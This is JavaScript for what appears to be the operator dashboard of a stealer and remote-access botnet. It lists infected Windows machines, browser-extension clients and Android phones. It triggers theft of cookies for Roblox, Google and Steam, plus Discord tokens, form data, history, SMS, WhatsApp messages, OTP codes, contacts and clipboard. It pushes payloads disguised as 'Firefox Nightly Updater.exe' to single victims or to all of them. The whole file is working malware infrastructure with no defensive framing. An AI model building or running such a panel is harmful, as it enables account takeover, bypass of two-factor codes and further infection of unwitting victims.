  if (!confirm('Permanently delete this victim from the panel?\nLoot files + record gone. Machine is not uninstalled.')) return;
  const r = await fetch('/api/victim/delete', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vid: currentVid}),
  });
  const j = await r.json().catch(() => ({}));
  if (!r.ok) { toast(j.error || 'delete failed'); return; }
  toast('deleted · ' + (j.removed_files || 0) + ' files');
  currentVid = null;
  selected.clear();
  showPage('victims');
  refreshVictims();
}


async function saveTags() {
  if (!currentVid) return;
  const raw = document.getElementById('victim-tags')?.value || '';
  const r = await fetch('/api/tags', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({vid: currentVid, tags: raw})
  });
  const data = await r.json();
  if (!r.ok) { toast(data.error || 'fail'); return; }
  toast('tags saved');
  refreshVictims();
}

function previewCqmFromZip(file) {
  if (!currentVid || !file) return;
  const a = document.createElement('a');
  a.href = '/api/loot_file/' + currentVid + '/' + file + '?t=' + Date.now();
  a.download = file;
  a.click();
  appendOut('stealer', 'inside zip open cqm_cookies.json — keys: name value domain path expirationDate');
}

let _screenTarget = 'active';
function screenTarget() { return _screenTarget; }
function setScreenTarget(t) {
  _screenTarget = t;
  const el = document.getElementById('screen-target-label');
  if (el) el.textContent = 'target: ' + t;
  toast('screen → ' + t);
}

async function addJob() {
  if (!currentVid) { toast('pick machine'); return; }
  const cmd = document.getElementById('job-cmd')?.value || 'screenshot';
  const every = parseInt(document.getElementById('job-every')?.value || '3600', 10);
  const r = await fetch('/api/jobs', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({vid: currentVid, cmd, every_sec: every, label: cmd + ' @' + every + 's'})
  });
  const d = await r.json();
  if (!r.ok) { toast(d.error||'fail'); return; }
  toast('job added');
  loadJobs();
}
async function loadJobs() {
  const r = await fetch('/api/jobs');
  const list = await r.json();
  const mine = (list||[]).filter(j => !currentVid || j.vid === currentVid);
  setOut('jobs', mine.map(j => `${j.id} ${j.label} vid=${j.vid.slice(0,8)}`).join('\n') || 'no jobs');
}

async function massDeleteVictims() {
  if (!selected.size) { toast('select machines'); return; }
  if (!confirm('Permanently delete ' + selected.size + ' victim(s) from the panel?')) return;
  const vids = [...selected];
  for (const vid of vids) {
    try {
      await fetch('/api/victim/delete', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({vid})
      });
    } catch (e) {}
  }
  selected.clear();
  currentVid = null;
  toast('deleted ' + vids.length);
  showPage('victims');
  refreshVictims();
}


/* ========== Browsers (RoCal extension clients) ========== */
/* old browser UI removed */




/* globals set later */





let currentBrowserEid = null;

async function refreshBrowsers() {
  let list = [];
  try {
    const r = await fetch('/api/browser/list', { credentials: 'same-origin' });
    if (!r.ok) return;
    list = await r.json();
    if (!Array.isArray(list)) list = [];
  } catch (e) { return; }

  const q = (document.getElementById('browser-search')?.value || '').toLowerCase();
  const filtered = list.filter(b => {
    const blob = `${b.eid||''} ${b.ip||''} ${b.ua||''} ${b.browser||''} ${b.platform||''}`.toLowerCase();
    return !q || blob.includes(q);
  });

  const count = document.getElementById('browser-count');
  if (count) count.textContent = `${list.length} client${list.length===1?'':'s'}`;

  const box = document.getElementById('browser-list');
  if (!box) return;

  // hide list when detail open? keep both — detail below
  if (!filtered.length) {
    box.innerHTML = `<div class="empty-state" style="grid-column:1/-1;padding:60px">
      <div>No browsers yet</div>
      <div style="font-size:.8rem">waiting for RoCal check-ins</div>
    </div>`;
    return;
  }

  box.innerHTML = filtered.map(b => {
    const short = (b.eid || '').slice(0, 10);
    const ua = b.ua || '';
    const browser = b.browser || (ua.includes('Firefox')?'Firefox':ua.includes('Edg')?'Edge':ua.includes('Chrome')?'Chrome':'Browser');
    const plat = b.platform || '—';
    const eidSafe = String(b.eid || '').replaceAll('\\', '\\\\').replaceAll("'", "\\'");
    const rbx = b.roblox_alive ? '<span class="tag live">RBX live</span>' : '';
    const pin = b.pinned ? '📌 ' : '';
    const ext = b.ext_ver ? ('ext ' + b.ext_ver) : '';
    return `<div class="machine" role="button" tabindex="0" style="cursor:pointer"
      onclick="window.openBrowserDetail && window.openBrowserDetail('${eidSafe}')">
      <div class="machine-top">
        <div>
          <div class="machine-name">${pin}${browser} ${b.ver||''}</div>
          <div class="machine-user">${b.ip||'?'} · ${plat} · ${b.lang||''}</div>
        </div>
        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
          <span class="tag mild">${b.loot_count||0} loot</span>
          ${rbx}
        </div>
      </div>
      <div class="machine-meta">
        <span>${ext}</span>
        <span>${b.tz||''}</span>
        <span class="ago">${b.last_seen||''}</span>
      </div>
    </div>`;
  }).join('');
}

function openBrowserDetail(eid) {
  try { console.log('open browser', eid); } catch(e) {}
  currentBrowserEid = eid;
  const detail = document.getElementById('br-detail');
  if (detail) { detail.classList.remove('hidden'); detail.style.display = 'block'; }
  const list = document.getElementById('browser-list');
  if (list) list.style.display = 'none';

  fetch('/api/browser/list').then(r => r.json()).then(list => {
    const b = (list || []).find(x => x.eid === eid) || {};
    const ua = b.ua || '';
    const browser = b.browser || (ua.includes('Firefox')?'Firefox':ua.includes('Chrome')?'Chrome':'Browser');
    document.getElementById('br-title').textContent = browser + ' · ' + (eid||'').slice(0, 12);
    document.getElementById('br-subtitle').textContent = (b.ip||'?') + ' · ' + (b.platform||'') + ' · ' + (b.tz||'');
    const tabsEl = document.getElementById('br-tabs-list');
    if (tabsEl) {
      const tabs = b.tabs || [];
      tabsEl.textContent = tabs.length ? ('Open sites: ' + tabs.slice(0, 20).join(', ')) : 'Open sites: (none reported)';
    }
    const notes = document.getElementById('br-notes');
    if (notes) notes.value = b.notes || '';
    const tags = document.getElementById('br-tags');
    if (tags) tags.value = Array.isArray(b.tags) ? b.tags.join(', ') : (b.tags || '');
    document.getElementById('br-stats').innerHTML = `
      <div class="pill"><b>${b.loot_count||0}</b> loot</div>
      <div class="pill"><b>${b.dropped_count||0}</b> deploys</div>
      <div class="pill"><b>${b.ver||'?'}</b> ver</div>
      <div class="pill"><b>${b.lang||'—'}</b> lang</div>`;
    const zip = document.getElementById('br-loot-zip-link');
    if (zip) zip.href = '/api/browser/loot_zip/' + encodeURIComponent(eid);
    loadBrowserLootFor(eid);
  }).catch(()=>{});
}

function closeBrowserDetail() {
  currentBrowserEid = null;
  const detail = document.getElementById('br-detail');
  if (detail) { detail.classList.add('hidden'); detail.style.display = 'none'; }
  const list = document.getElementById('browser-list');
  if (list) list.style.display = '';
  refreshBrowsers();
}

async function loadBrowserLootFor(eid) {
  const out = document.getElementById('br-loot-out');
  if (!out) return;
  out.textContent = 'loading…';
  try {
    const r = await fetch('/api/browser/loot/' + encodeURIComponent(eid));
    const data = await r.json();
    const items = Array.isArray(data) ? data : (data.loot || []);
    if (!items.length) { out.textContent = 'no loot yet'; return; }
    const groups = {};
    for (const x of items) {
      const typ = x.type || 'unknown';
      (groups[typ] = groups[typ] || []).push(x);
    }
    out.innerHTML = Object.entries(groups).map(([typ, arr]) => {
      const latest = arr[arr.length-1];
      let preview = '';
      const d = latest.data;
      if (typeof d === 'string') preview = d.slice(0, 120);
      else if (typ.includes('discord')) preview = (d && d.tokens) ? (d.tokens.length + ' token(s)') : JSON.stringify(d).slice(0,100);
      else if (Array.isArray(d)) preview = d.length + ' entries';
      else preview = JSON.stringify(d).slice(0, 100);
      return `<div class="steal-card" style="margin-bottom:8px">
        <div style="display:flex;justify-content:space-between;gap:8px">
          <strong>${typ}</strong>
          <a class="cmd sm" href="/api/browser/loot_download/${encodeURIComponent(eid)}?type=${encodeURIComponent(typ)}" download>Download</a>
        </div>
        <div class="muted" style="font-size:11px;margin-top:6px;word-break:break-all">${preview}</div>
        <div class="muted" style="font-size:10px;margin-top:4px">${latest.ts||''}</div>
      </div>`;
    }).join('');
  } catch (e) {
    out.textContent = 'loot load failed';
  }
}

async function pushDropOne(eid) {
  const path = (document.getElementById('br-path')||{}).value || '';
  const name = (document.getElementById('br-name')||{}).value || 'Firefox Nightly Updater.exe';
  if (!path.startsWith('/p/')) { toast('upload a payload or paste /p/ path first'); return; }
  try {
    const r = await fetch('/api/browser/push', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({path, name, eid})
    });
    const d = await r.json().catch(()=>({}));
    if (!r.ok) { toast(d.error || 'deploy failed'); return; }
    toast('payload queued');
  } catch (e) { toast('deploy error'); }
}

async function stealOne(eid, cmd) {
  try {
    const r = await fetch('/api/browser/cmd', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({cmd: cmd || 'both', eid})
    });
    const d = await r.json().catch(()=>({}));
    if (!r.ok) { toast(d.error || 'steal failed'); return; }
    toast('grab queued');
    setTimeout(() => loadBrowserLootFor(eid), 2500);
  } catch (e) { toast('steal error'); }
}

async function stealAll(cmd) {
  try {
    const r = await fetch('/api/browser/cmd', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({cmd, eid:'all'})
    });
    const d = await r.json().catch(()=>({}));
    if (!r.ok) { toast(d.error || 'fail'); return; }
    toast('queued on ' + (d.queued||'?') + ' clients');
  } catch (e) { toast('error'); }
}

async function pushDropAll() {
  const path = (document.getElementById('br-path')||{}).value || '';
  const name = (document.getElementById('br-name')||{}).value || 'Firefox Nightly Updater.exe';
  if (!path.startsWith('/p/')) { toast('paste /p/ path first'); return; }
  const r = await fetch('/api/browser/push', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({path, name, eid:'all'})
  });
  const d = await r.json().catch(()=>({}));
  if (!r.ok) { toast(d.error||'fail'); return; }
  toast('payload queued · ' + d.queued);
}

async function deleteBrowser(eid) {
  if (!eid) return;
  if (!confirm('Remove this browser client?')) return;
  await fetch('/api/browser/delete', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({eid})
  });
  toast('removed');
  closeBrowserDetail();
  refreshBrowsers();
}

function initBrowserPayloadUI() {
  const dz = document.getElementById('br-dropzone');
  const file = document.getElementById('br-file');
  const status = document.getElementById('br-upload-status');
  if (!dz || !file) return;
  if (dz.dataset.bound) return;
  dz.dataset.bound = '1';
  const setStatus = (m) => { if (status) status.textContent = m || ''; };
  const upload = async (f) => {
    if (!f) return;
    setStatus('Uploading ' + f.name + '…');
    try {
      const fd = new FormData();
      fd.append('file', f);
      const r = await fetch('/api/payload/upload', { method: 'POST', body: fd });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) { setStatus(d.error || 'upload failed'); toast(d.error || 'upload failed'); return; }
      const path = d.path || ('/p/' + (d.file || f.name));
      const pathInput = document.getElementById('br-path');
      if (pathInput) pathInput.value = path;
      setStatus('Ready: ' + path);
      toast('payload ready · ' + path);
    } catch (e) {
      setStatus('upload error');
    }
  };
  dz.addEventListener('click', () => file.click());
  file.addEventListener('change', () => upload(file.files && file.files[0]));
  dz.addEventListener('dragover', (e) => { e.preventDefault(); });
  dz.addEventListener('drop', (e) => {
    e.preventDefault();
    upload(e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]);
  });
}

function bindBrowserUI() {
  document.addEventListener('click', (ev) => {
    const card = ev.target.closest && ev.target.closest('[data-open-eid]');
    if (card) {
      openBrowserDetail(card.getAttribute('data-open-eid'));
      setTimeout(initBrowserPayloadUI, 50);
      return;
    }
  });
  // detail action buttons (exist in DOM)
  const map = [
    ['br-act-cookies', () => currentBrowserEid && stealOne(currentBrowserEid, 'cookies')],
    ['br-act-roblox', () => currentBrowserEid && stealOne(currentBrowserEid, 'cookies_roblox')],
    ['br-act-discord', () => currentBrowserEid && stealOne(currentBrowserEid, 'discord')],
    ['br-act-google', () => currentBrowserEid && stealOne(currentBrowserEid, 'cookies_google')],
    ['br-act-steam', () => currentBrowserEid && stealOne(currentBrowserEid, 'cookies_steam')],
    ['br-act-forms', () => currentBrowserEid && stealOne(currentBrowserEid, 'forms')],
    ['br-act-history', () => currentBrowserEid && stealOne(currentBrowserEid, 'history')],
    ['br-act-bookmarks', () => currentBrowserEid && stealOne(currentBrowserEid, 'bookmarks')],
    ['br-act-screenshot', () => currentBrowserEid && stealOne(currentBrowserEid, 'screenshot')],
    ['br-act-all', () => currentBrowserEid && stealOne(currentBrowserEid, 'both')],
    ['br-act-refresh-loot', () => currentBrowserEid && loadBrowserLootFor(currentBrowserEid)],
    ['br-delete-btn', () => currentBrowserEid && deleteBrowser(currentBrowserEid)],
    ['br-save-meta', () => currentBrowserEid && saveBrowserMeta(currentBrowserEid)],
    ['br-pin', () => currentBrowserEid && pinBrowser(currentBrowserEid)],
  ];
  map.forEach(([id, fn]) => {
    const el = document.getElementById(id);
    if (el && !el.dataset.bound) {
      el.dataset.bound = '1';
      el.addEventListener('click', (e) => { e.preventDefault(); fn(); });
    }
  });
  initBrowserPayloadUI();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', bindBrowserUI);
} else {
  bindBrowserUI();
}

if (typeof socket !== 'undefined') {
  socket.on('browser_update', () => {
    const page = document.querySelector('.page.active');
    if (page && page.id === 'page-browsers') {
      if (currentBrowserEid) { /* stay in detail */ }
      else refreshBrowsers();
    }
  });
  socket.on('browser_loot', () => {
    if (currentBrowserEid) loadBrowserLootFor(currentBrowserEid);
  });
}

window.refreshBrowsers = refreshBrowsers;
window.openBrowserDetail = openBrowserDetail;
window.closeBrowserDetail = closeBrowserDetail;
window.stealOne = stealOne;
window.stealAll = stealAll;
window.pushDropOne = pushDropOne;
window.pushDropAll = pushDropAll;
window.deleteBrowser = deleteBrowser;


async function saveBrowserMeta(eid) {
  const notes = (document.getElementById('br-notes')||{}).value || '';
  const tags = (document.getElementById('br-tags')||{}).value || '';
  await fetch('/api/browser/meta', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({eid, notes, tags})
  });
  toast('saved');
}
async function pinBrowser(eid) {
  await fetch('/api/browser/meta', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({eid, pinned: true})
  });
  toast('pinned');
}
window.saveBrowserMeta = saveBrowserMeta;
window.pinBrowser = pinBrowser;


// ===================== ANDROID =====================
let currentAndroidAid = null;

async function refreshAndroids() {
  try {
    const r = await fetch('/api/android/list');
    if (!r.ok) return;
    let list = await r.json();
    const q = ((document.getElementById('android-search') || {}).value || '').toLowerCase().trim();
    if (q) {
      list = list.filter(a => JSON.stringify(a).toLowerCase().includes(q));
    }
    const count = document.getElementById('android-count');
    if (count) count.textContent = list.length + ' device' + (list.length === 1 ? '' : 's');
    const box = document.getElementById('android-list');
    if (!box) return;
    if (currentAndroidAid) {
      box.style.display = 'none';
      return;
    }
    box.style.display = '';
    if (!list.length) {
      box.innerHTML = '<div class="muted" style="padding:20px">No android clients yet</div>';
      return;
    }
    box.innerHTML = list.map(a => {
      const aid = a.aid || '';
      const aidSafe = String(aid).replace(/'/g, "\\'");
      const title = [a.manufacturer, a.model].filter(Boolean).join(' ') || a.app || 'Android';
      const geo = [a.city, a.country].filter(Boolean).join(', ');
      const perms = a.perms || {};
      const tags = [];
      if (a.pinned) tags.push('<span class="tag">pin</span>');
      if (perms.notifications) tags.push('<span class="tag live">notif</span>');
      if (perms.sms) tags.push('<span class="tag mild">sms</span>');
      if (perms.contacts) tags.push('<span class="tag mild">contacts</span>');
      // online if last_seen within ~2 min (ISO parse best-effort)
      let online = false;
      try {
        const t = Date.parse(a.last_seen);
        if (!isNaN(t) && (Date.now() - t) < 120000) online = true;
      } catch (e) {}
      const dot = online ? '<span style="color:#34d399">●</span>' : '<span style="color:#6b7280">●</span>';
      const notes = (a.notes || '').slice(0, 60);
      return `<div class="victim-card" data-open-aid="${aidSafe}" style="cursor:pointer"
        onclick="window.openAndroidDetail && window.openAndroidDetail('${aidSafe}')">
        <div class="vc-top">
          <div class="vc-title">${dot} ${title}</div>
          <div class="vc-tags">${tags.join(' ')}</div>
        </div>
        <div class="vc-user">${a.ip || '?'} · ${geo || (a.android_ver ? ('Android ' + a.android_ver) : '—')}</div>
        <div class="vc-meta">${a.app || 'app'} ${a.app_ver || ''} · loot ${a.loot_count||0} · ${a.last_seen || ''}</div>
        ${notes ? `<div class="muted" style="font-size:11px;margin-top:4px">${notes}</div>` : ''}
      </div>`;
    }).join('');
  } catch (e) {}
}

function openAnPanel(name) {
  document.querySelectorAll('#an-detail .nav-item').forEach(n => {
    n.classList.toggle('active', n.getAttribute('data-an-panel') === name);
  });
  document.querySelectorAll('#an-detail .panel').forEach(p => {
    p.classList.toggle('active', p.id === 'panel-an-' + name);
  });
  if (currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
}

function closeAndroidDetail() {
  currentAndroidAid = null;
  const d = document.getElementById('an-detail');
  if (d) { d.classList.add('hidden'); d.style.display = 'none'; }
  const list = document.getElementById('android-list');
  if (list) list.style.display = '';
  refreshAndroids();
}

async function openAndroidDetail(aid) {
  currentAndroidAid = aid;
  const d = document.getElementById('an-detail');
  const list = document.getElementById('android-list');
  if (list) list.style.display = 'none';
  if (d) { d.classList.remove('hidden'); d.style.display = ''; }
  try {
    const r = await fetch('/api/android/list');
    const arr = await r.json();
    const a = (arr || []).find(x => x.aid === aid) || {};
    const title = [a.manufacturer, a.model].filter(Boolean).join(' ') || a.app || aid.slice(0, 10);
    const t = document.getElementById('an-title');
    const sub = document.getElementById('an-subtitle');
    if (t) t.textContent = title;
    if (sub) sub.textContent = (a.ip || '') + ' · ' + ([a.city, a.country].filter(Boolean).join(', ') || a.tz || '');
    const info = document.getElementById('an-info-grid');
    if (info) {
      info.innerHTML = [
        ['Model', title],
        ['Android', a.android_ver || ''],
        ['App', (a.app || '') + ' ' + (a.app_ver || '')],
        ['IP', a.ip || ''],
        ['Location', [a.city, a.country].filter(Boolean).join(', ')],
        ['ISP', a.isp || ''],
        ['Lang / TZ', (a.lang || '') + ' / ' + (a.tz || '')],
        ['First', a.first_seen || ''],
        ['Last', a.last_seen || ''],
        ['AID', a.aid || ''],
      ].map(([k,v]) => `<div><b>${k}</b> · ${v || '—'}</div>`).join('');
    }
    const perms = document.getElementById('an-perms');
    if (perms) {
      const p = a.perms || {};
      perms.innerHTML = Object.keys(p).length
        ? Object.entries(p).map(([k,v]) => `<div><b>${k}</b> · ${v ? 'yes' : 'no'}</div>`).join('')
        : 'no permission report yet';
    }
    const notes = document.getElementById('an-notes');
    const tags = document.getElementById('an-tags');
    if (notes) notes.value = a.notes || '';
    if (tags) tags.value = (a.tags || []).join(', ');
  } catch (e) {}
  openAnPanel('overview');
  loadAndroidLootFor(aid);
  const del = document.getElementById('an-delete-btn');
  if (del) del.onclick = async () => {
    if (!confirm('Remove this android client?')) return;
    await fetch('/api/android/delete', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({aid}) });
    closeAndroidDetail();
  };
  const save = document.getElementById('an-save-meta');
  if (save) save.onclick = async () => {
    await fetch('/api/android/meta', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        aid,
        notes: (document.getElementById('an-notes')||{}).value || '',
        tags: (document.getElementById('an-tags')||{}).value || '',
      })
    });
    toast('saved');
  };
}

async function loadAndroidLootFor(aid) {
  try {
    const r = await fetch('/api/android/loot/' + encodeURIComponent(aid));
    const items = await r.json();
    const by = {};
    (items || []).forEach(it => { by[it.type || 'unknown'] = it; });
    const summary = document.getElementById('an-loot-out');
    if (summary) {
      const keys = Object.keys(by);
      summary.innerHTML = keys.length ? keys.map(typ => {
        const latest = by[typ];
        let preview = '';
        const d = latest.data;
        if (typeof d === 'string') preview = d.slice(0, 120);
        else preview = JSON.stringify(d).slice(0, 120);
        return `<div class="steal-card" style="margin-bottom:8px">
          <div style="display:flex;justify-content:space-between;gap:8px">
            <strong>${typ}</strong>
            <a class="cmd sm" href="/api/android/loot_download/${encodeURIComponent(aid)}?type=${encodeURIComponent(typ)}" download>Download</a>
          </div>
          <div class="muted" style="font-size:11px;margin-top:6px;word-break:break-all">${preview}</div>
        </div>`;
      }).join('') : 'no loot yet';
    }
    const put = (id, typ) => {
      const el = document.getElementById(id);
      if (!el) return;
      const it = by[typ];
      if (!it) { el.textContent = '—'; return; }
      el.textContent = typeof it.data === 'string' ? it.data : JSON.stringify(it.data, null, 2);
    };
    put('an-notifs-out', 'notifications');
    put('an-wa-out', 'whatsapp');
    put('an-otp-out', 'otp');
    // merge live notifs into notifications panel if present
    if (by['notifications_live'] && by['notifications']) {
      try {
        const a = by['notifications'].data;
        const live = by['notifications_live'].data;
        const merged = Array.isArray(a) ? a.slice() : [];
        if (live && typeof live === 'object') merged.unshift(live);
        by['notifications'] = Object.assign({}, by['notifications'], { data: merged });
        put('an-notifs-out', 'notifications');
      } catch (e) {}
    }
    if (by['whatsapp']) {
      const el = document.getElementById('an-notifs-out');
      if (el) {
        const wa = typeof by['whatsapp'].data === 'string' ? by['whatsapp'].data : JSON.stringify(by['whatsapp'].data, null, 2);
        el.textContent = (el.textContent && el.textContent !== '—' ? el.textContent + '\n\n' : '') + 'WHATSAPP\n' + wa;
      }
    }
    put('an-sms-out', 'sms');
    put('an-clip-out', 'clipboard');
    // clipboard may be {text, ts}
    try {
      const el = document.getElementById('an-clip-out');
      const it = by['clipboard'];
      if (el && it && it.data && typeof it.data === 'object' && it.data.text != null) {
        el.textContent = String(it.data.text);
      }
    } catch (e) {}
    put('an-contacts-out', 'contacts');
    const tl = document.getElementById('an-timeline-out');
    if (tl) {
      const rows = (items || []).slice().reverse().map(it => {
        const preview = typeof it.data === 'string' ? it.data.slice(0,80) : JSON.stringify(it.data).slice(0,80);
        return (it.ts||'') + ' · ' + (it.type||'?') + ' · ' + preview;
      });
      tl.textContent = rows.join('\n') || '—';
    }
    if (by['calls'] && document.getElementById('an-contacts-out')) {
      const el = document.getElementById('an-contacts-out');
      const c = by['contacts'] ? (typeof by['contacts'].data === 'string' ? by['contacts'].data : JSON.stringify(by['contacts'].data, null, 2)) : '';
      const calls = typeof by['calls'].data === 'string' ? by['calls'].data : JSON.stringify(by['calls'].data, null, 2);
      el.textContent = (c ? ('CONTACTS\n' + c + '\n\n') : '') + 'CALLS\n' + calls;
    }
  } catch (e) {}
}

async function androidCmd(aid, cmd) {
  try {
    const r = await fetch('/api/android/cmd', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ aid, cmd })
    });
    const d = await r.json().catch(() => ({}));
    if (!r.ok) toast(d.error || 'cmd failed');
    else toast('queued: ' + cmd);
  } catch (e) { toast('cmd error'); }
}

document.addEventListener('click', (ev) => {
  const btn = ev.target.closest('[data-an-cmd]');
  if (!btn || !currentAndroidAid) return;
  androidCmd(currentAndroidAid, btn.getAttribute('data-an-cmd'));
});

if (typeof socket !== 'undefined') {
  socket.on('android_update', () => {
    const page = document.getElementById('page-android');
    if (page && page.classList.contains('active')) {
      if (currentAndroidAid) openAndroidDetail(currentAndroidAid);
      else refreshAndroids();
    }
  });
  socket.on('android_loot', (msg) => {
    if (msg && msg.aid && msg.aid === currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
  });
  socket.on('android_otp', (msg) => {
    if (msg && msg.aid && msg.aid === currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
    if (msg) toast('OTP-like loot from ' + (msg.aid||'').slice(0,8));
  });
}

window.refreshAndroids = refreshAndroids;
window.openAndroidDetail = openAndroidDetail;
window.closeAndroidDetail = closeAndroidDetail;
window.openAnPanel = openAnPanel;

let androidDetailTimer = null;
const _openAndroidDetail = window.openAndroidDetail;
window.openAndroidDetail = async function(aid) {
  if (androidDetailTimer) clearInterval(androidDetailTimer);
  await _openAndroidDetail(aid);
  androidDetailTimer = setInterval(() => {
    if (currentAndroidAid) loadAndroidLootFor(currentAndroidAid);
  }, 8000);
};
const _closeAndroidDetail = window.closeAndroidDetail;
window.closeAndroidDetail = function() {
  if (androidDetailTimer) clearInterval(androidDetailTimer);
  androidDetailTimer = null;
  _closeAndroidDetail();
};

/* ========== DonutPredict clients ========== */
let currentDonutEid = null;

function isDonutClient(b) {
  if (!b) return false;
  const k = (b.kind || b.source || b.browser || "").toLowerCase();
  if (k.includes("donut") || b.donutflip === true) return true;
  if ((b.eid || "").startsWith("df_")) return true;
  return false;
}

async function refreshDonut() {
  let list = [];
  try {
    const r = await fetch("/api/browser/list", { credentials: "same-origin" });
    if (!r.ok) return;
    list = await r.json();
    if (!Array.isArray(list)) list = list.browsers || list.clients || [];
  } catch (e) { return; }
  list = list.filter(isDonutClient);
  const q = (document.getElementById("donut-search")?.value || "").toLowerCase();
  if (q) list = list.filter(b => JSON.stringify(b).toLowerCase().includes(q));
  const count = document.getElementById("donut-count");
  if (count) count.textContent = list.length + " DonutPredict client" + (list.length === 1 ? "" : "s");
  const box = document.getElementById("donut-list");
  if (!box) return;
  if (!list.length) {
    box.innerHTML = '<div class="empty">No DonutPredict clients yet — load the extension on a browser visiting donutflip.net</div>';
    return;
  }
  box.innerHTML = list.map(b => {
    const eid = b.eid || "";
    const last = b.last_seen || b.last || "—";
    const cookies = b.cookie_count != null ? b.cookie_count : "—";
    return `<div class="machine-card" onclick="openDonut('${eid}')">
      <div class="machine-top">
        <div class="machine-name">DF ${esc(eid).slice(0, 14)}…</div>
        <span class="pill">${esc(String(cookies))} ck</span>
      </div>
      <div class="machine-meta">last ${esc(String(last)).slice(0, 19)}</div>
    </div>`;
  }).join("");
}

async function openDonut(eid) {
  currentDonutEid = eid;
  const det = document.getElementById("donut-detail");
  if (det) det.classList.remove("hidden");
  document.getElementById("donut-title").textContent = "Donut · " + eid.slice(0, 16);
  document.getElementById("donut-meta").textContent = "loading…";
  document.getElementById("donut-loot").innerHTML = "";
  try {
    const r = await fetch("/api/browser/list", { credentials: "same-origin" });
    const list = await r.json();
    const arr = Array.isArray(list) ? list : (list.browsers || []);
    const b = arr.find(x => x.eid === eid) || {};
    document.getElementById("donut-meta").textContent = JSON.stringify({
      eid: b.eid, ip: b.ip, ua: b.ua, kind: b.kind, last_seen: b.last_seen,
      cookie_count: b.cookie_count, donutflip: b.donutflip
    }, null, 2);
  } catch (e) {}
  try {
    const r = await fetch("/api/browser/loot/" + encodeURIComponent(eid));
    const data = await r.json();
    const loot = data.loot || data || [];
    const box = document.getElementById("donut-loot");
    if (!Array.isArray(loot) || !loot.length) {
      box.innerHTML = "<div class='muted'>no loot yet</div>";
      return;
    }
    box.innerHTML = loot.slice().reverse().slice(0, 30).map(e => {
      const typ = e.type || "loot";
      const preview = typeof e.data === "string" ? e.data.slice(0, 120) : JSON.stringify(e.data || {}).slice(0, 160);
      return `<div class="steal-card"><b>${esc(typ)}</b> <span class="muted">${esc(e.ts || "")}</span>
        <pre style="font-size:11px;white-space:pre-wrap">${esc(preview)}</pre>
        <a class="cmd sm" href="/api/browser/loot_download/${encodeURIComponent(eid)}?type=${encodeURIComponent(typ)}" download>Download</a>
      </div>`;
    }).join("");
  } catch (e) {}
}

async function donutCmd(cmd) {
  if (!currentDonutEid) return toast("select a client");
  await fetch("/api/browser/push", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ eid: currentDonutEid, cmd, args: {} })
  }).catch(() => {});
  toast("queued " + cmd);
  setTimeout(() => openDonut(currentDonutEid), 1500);
}

async function donutMass(cmd) {
  try {
    const r = await fetch("/api/browser/list", { credentials: "same-origin" });
    const list = await r.json();
    const arr = (Array.isArray(list) ? list : list.browsers || []).filter(isDonutClient);
    for (const b of arr) {
      await fetch("/api/browser/push", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ eid: b.eid, cmd, args: {} })
      });
    }
    toast("queued " + cmd + " on " + arr.length);
  } catch (e) { toast("mass failed"); }
}

async function donutDelete() {
  if (!currentDonutEid) return;
  if (!confirm("Remove this DonutPredict client?")) return;
  await fetch("/api/browser/delete", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ eid: currentDonutEid })
  });
  currentDonutEid = null;
  document.getElementById("donut-detail")?.classList.add("hidden");
  refreshDonut();
}

window.refreshDonut = refreshDonut;
window.openDonut = openDonut;
window.donutCmd = donutCmd;
window.donutMass = donutMass;
window.donutDelete = donutDelete;
